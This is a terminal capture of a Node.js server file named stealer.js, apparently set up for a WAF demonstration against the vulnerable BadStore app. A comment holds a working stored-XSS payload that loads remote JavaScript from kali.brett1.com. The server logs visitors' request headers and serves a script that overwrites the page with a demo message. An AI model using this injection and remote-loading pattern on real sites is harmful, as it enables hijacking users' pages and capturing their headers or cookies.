root@kali:/home/ec2-user/node_launcher# cat stealer.js
//
// put this in the badstore comment field:
// <img src=1 onerror="s=document.createElement('script');s.src='//kali.brett1.com/static/evil.js';document.body.appendChild(s);"
//
const express = require('express')
const app = express()
var fs = require('fs');
var http = require('http');
var https = require('https');
// this key is for wafaas.brett1.com, so flip DNS to make it work
var privateKey  = fs.readFileSync('/etc/letsencrypt/live/kali.brett1.com/privkey.pem', 'utf8');
var certificate = fs.readFileSync('/etc/letsencrypt/live/kali.brett1.com/fullchain.pem', 'utf8');
var credentials = {key: privateKey, cert: certificate};

app.get('/', function (req, res) {
  console.log(JSON.stringify(req.headers));
  console.log(req.params);
  console.log(req.query);
  res.send("<script>alert('hello from kali!');</script>")
  res.end
})

app.get('/bogus.php', function (req, res) {
  console.log(JSON.stringify(req.headers));
  console.log(req.params);
  console.log(req.query);
  res.send('hello world')
  res.end
})


app.get('/static/evil.js', function (req, res) {
  console.log(JSON.stringify(req.headers));
  console.log(req.params);
  console.log(req.query);


  res.send("dB = document.body; dB.innerHTML = \"<div id='overlay' style='position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; border: 0; margin: 0; background-color: black;'><div id='msg' style='margin: 0 auto; text-align: center; margin-top: 140px; font-size: 16px; font-family: monospace; color: white;'></div></div>\"; document.getElementById('msg').innerHTML = ' '; document.getElementById('msg').innerHTML = 'Hello from John, Simon, and Gabe...<br>This javascript injection/xss lives on kali.brett1.com,<br> but your browser has gone to that site, downloaded it, and executed the javascript! How???<br>...watch the network flow in developer tools to see what happened...<br> PS Use the Barracuda WAF to stop things like this from happening, OWASP Top 10 is no joke!';")

  res.end
})

var httpServer = http.createServer(app);
var httpsServer = https.createServer(credentials, app);

httpServer.listen(80);
httpsServer.listen(443);
root@kali:/home/ec2-user/node_launcher#
